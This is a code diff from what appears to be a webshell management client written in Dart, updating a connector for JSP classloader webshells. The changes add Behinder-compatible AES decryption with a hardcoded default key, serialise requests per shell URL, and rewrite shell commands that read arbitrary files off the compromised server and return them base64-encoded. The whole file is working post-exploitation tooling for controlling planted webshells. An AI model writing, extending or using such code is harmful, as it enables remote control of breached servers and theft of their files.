@@ -6,6 +6,8 @@ import 'dart:typed_data';
 
 import '../core/debug_log.dart';
 import '../core/asset_loader.dart';
+import '../core/async/serial_queue.dart';
+import '../core/crypto/behinder_crypto.dart';
 import 'package:http/http.dart' as http;
 
 import '../models/file_entry.dart';
@@ -21,6 +23,12 @@ import 'shell_exec_connector.dart';
 /// [Webshell.password] 表示 **表单参数名**（须与 JSP 中 `getParameter` 一致），默认 `mAtrix_911`。
 class JspClassloaderConnector extends ShellConnector {
   JspClassloaderConnector(super.webshell);
+
+  /// 内置 jsp_classloader_b64.jsp 不设置 session key，M.class 回退到默认值。
+  static const String _kDefaultKey = '42b842fc69195c9d';
+
+  /// JSP Session 型：ClassLoader defineClass 也依赖 JSESSIONID，并发会串号。
+  late final SerialQueue _sendQueue = SerialQueue.forKey(webshell.url);
 
   late final String _execKey = _randomHex32();
   String? _lastPingDiagnostic;
@@ -208,17 +216,29 @@ class JspClassloaderConnector extends ShellConnector {
         ),
       ];
 
-      final response = await _postLargeForm(
-        uri,
-        {
-          'Content-Type':
-              'application/x-www-form-urlencoded; charset=UTF-8',
-        },
-        bodyParts.join('&'),
+      final response = await _sendQueue.run(
+        () => _postLargeForm(
+          uri,
+          {
+            'Content-Type':
+                'application/x-www-form-urlencoded; charset=UTF-8',
+          },
+          bodyParts.join('&'),
+        ),
       );
 
       if (response.statusCode == 200) {
-        return decodeWithFallback(response.bodyBytes);
+        final body = decodeWithFallback(response.bodyBytes);
+        // M.class 与冰蝎一致：响应是 base64(AES/ECB(JSON))。
+        final decrypted =
+            BehinderCrypto.tryDecryptJsp(body, _kDefaultKey) ??
+            BehinderCrypto.tryDecryptJspWithMagic(
+              response.bodyBytes,
+              _kDefaultKey,
+            ) ??
+            BehinderCrypto.tryDecryptLegacyMatrix(body, _kDefaultKey);
+        if (decrypted != null) return BehinderCrypto.extractResponse(decrypted);
+        return body;
       }
       final body = decodeWithFallback(response.bodyBytes);
       final snippet = body.length > 4096
@@ -420,22 +440,26 @@ class JspClassloaderConnector extends ShellConnector {
     if (_hasNonAscii(path)) {
       final b64Path = base64.encode(utf8.encode(path));
       cmd =
-          "_p=\$(echo ${_sq(b64Path)} | base64 -d)"
-          " && cat \"\$_p\" 2>/dev/null | base64 -w0 2>/dev/null"
-          " || cat \"\$_p\" 2>/dev/null | base64";
+          "_p=\$(echo ${_sq(b64Path)} | base64 -d); "
+          "if [ ! -f \"\$_p\" ]; then echo __MX_FILE_MISSING__; "
+          "else cat \"\$_p\" 2>/dev/null | base64 -w0 2>/dev/null "
+          "|| cat \"\$_p\" 2>/dev/null | base64; fi";
     } else {
       cmd =
-          'cat ${_sq(path)} 2>/dev/null | base64 -w0 2>/dev/null'
-          " || cat ${_sq(path)} 2>/dev/null | base64";
+          'if [ ! -f ${_sq(path)} ]; then echo __MX_FILE_MISSING__; '
+          'else cat ${_sq(path)} 2>/dev/null | base64 -w0 2>/dev/null '
+          "|| cat ${_sq(path)} 2>/dev/null | base64; fi";
     }
     final result = await _sendJsp(
       'exec',
       extraParams: {'_k': _execKey, _execKey: cmd},
     );
-    final b64 = result.trim().replaceAll(RegExp(r'\s'), '');
-    if (b64.isEmpty || b64.startsWith('[')) {
-      throw Exception('无法读取文件: $b64');
+    if (result.contains('__MX_FILE_MISSING__')) {
+      throw Exception('无法读取文件: 文件不存在');
     }
+    final b64 = result.trim().replaceAll(RegExp(r'\s'), '');
+    if (b64.isEmpty) return Uint8List(0);
+    if (b64.startsWith('[')) throw Exception('无法读取文件: $b64');
     return base64.decode(b64);
   }
 
